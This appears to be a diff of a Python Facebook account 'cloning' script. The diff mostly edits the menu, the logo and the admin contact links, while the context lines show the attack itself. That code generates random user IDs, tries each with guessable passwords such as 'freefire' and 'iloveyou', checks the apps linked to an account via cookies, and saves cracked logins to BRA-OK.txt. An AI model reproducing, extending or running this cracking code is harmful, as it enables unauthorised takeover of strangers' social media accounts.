@@ -119,10 +119,10 @@ logo=("""
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━╦━━━━━━━━━━━━━━━╗
 ┃ ██████  ██████   █████  ┃ ➊ OWNER ➸ BRA ┃
 ┃ ██   ██ ██   ██ ██   ██ ┃ ➋ TOOLS ➸ BRA ┃
-┃ ██████  ██████  ███████ ┃ ➌ VRSON ➸ 0.1 ┃╔═╗╔═╗╔═╗
-┃ ██   ██ ██   ██ ██   ██ ┃ ➍ STTUS ➸ OWN ┃║═╣╠╦╝╠═╣
-┃ ██████  ██   ██ ██   ██ ┃ ➎ RANKS ➸ 1.X ┃╚═╝╩╚═╩ ╩ 
-╚━━━━━━━━━━━━━━━━━━━━━━━━━╩━━━━━━━━━━━━━━━╝
+┃ ██████  ██████  ███████ ┃ ➌ VRSON ➸ 0.1 ┃
+┃ ██   ██ ██   ██ ██   ██ ┃ ➍ STTUS ➸ OWN ┃╔═╗╔═╗╔═╗
+┃ ██████  ██   ██ ██   ██ ┃ ➎ RANKS ➸ 1.X ┃║═╣╠╦╝╠═╣
+╚━━━━━━━━━━━━━━━━━━━━━━━━━╩━━━━━━━━━━━━━━━╝╚═╝╩╚═╩ ╩ 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 def cek_apk(session,coki):
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
@@ -150,23 +150,24 @@ def cek_apk(session,coki):
 def Main():
 	os.system('clear')
 	print(logo)
-	print(" \033[1;37m[1] \033[1;91mRANDOM CLONING")
-	print(" \033[1;37m[2] \033[1;94mCONTACT ADMIN")
-	print(" \033[1;37m[3] \033[1;92mFOLLOW MY FB PROFILE")
-	print(" \033[1;37m[4] \033[1;93mJOIN MESSENGER GROUP")
-	print(' \033[1;37m[0] \033[1;95mEXIT PROGRAMMING')
-	print(' \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+	print("\033[1;37m[1] \033[1;91mRANDOM CLONING")
+	print("\033[1;37m[2] \033[1;94mCONTACT ADMINS")
+	print("\033[1;37m[3] \033[1;92mFOLLOW MY FB")
+	print("\033[1;37m[4] \033[1;93mJOIN MY GROUP")
+	print('\033[1;37m[0] \033[1;95mEXIT PROGRAMMING')
+	print('\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 	opt = input('Choose option >>> ')
-	if opt == '1':
+	if opt in ["A","1"]:
 		os.system('xdg-open https://www.facebook.com/')
 		BRA()
 	if opt in ["B","2"]:
+		os.system('xdg-open https://www.facebook.com/')
 		admin()
 	if opt in ["C","3"]:
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100080957155376');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/');time.sleep(1)
 		fb()
 	if opt in ["D","4"]:
-		os.system('xdg-open https://facebook.com/groups/1059611414758209/');time.sleep(1)
+		os.system('xdg-open https://facebook.com//');time.sleep(1)
 		group()
 	if opt in ["0","0"]:
 		exit()
@@ -178,19 +179,19 @@ def admin():
 	os.system('clear')
 	print(logo)
 	print(50*'_')
-	print(' [1] Contract WhatsApp ')
-	print(' [2] JOIN MY FB GROUP ')
-	print(' [3] FOLLOW MY FACEBOOK ')
+	print(' [1] CONTACT WA ')
+	print(' [2] JOIN MY FB ')
+	print(' [3] FOLLOW MY FB ')
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801311321651');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801878943692');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://facebook.com/groups/1059611414758209/');time.sleep(1)
+		os.system('xdg-open https://facebook.com//');time.sleep(1)
 		admin()
 	if bal =='3':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100080957155376');time.sleep(1)
+		os.system('xdg-open https://www.facebook.com/');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -223,10 +224,10 @@ def BRA():
 			uid = kode+koda+kodb+guru
 			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','freefire','Free fire','iloveyou','Bangladesh','bangladesh','i love you']
 			yaari.submit(b,uid,pwx,tl)
-	print(50*'_')
+
 	print(' [💀] CRACK PROCESS HAS BEEN COMPLETED')
-	print(' [❤️‍🩹] IDS SAVED IN ▶SDCARD▶BRA-OK.txt [OR] BRA-CP.txt')
-	print(50*'_')
+	print(' [🖤] IDS SAVED IN SDCARD ▶ BRA-OK.txt [OR] BRA-CP.txt')
+
 	exit()
 
 def b(uid,pwx,tl):
@@ -237,7 +238,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;95m[\033[1;93mSCAN\033[1;95m] <> \033[1;96m%s/%s\033[1;95m <> \033[1;95m[\033[1;92mBRA-OK:%s\033[1;95m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;95m[\033[1;93mSCANNING\033[1;95m] <> \033[1;96m%s/%s\033[1;95m <> \033[1;95m[\033[1;92mBRA-OK:%s\033[1;95m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -289,3 +290,4 @@ def b(uid,pwx,tl):
         pass
 Main()
 
+	
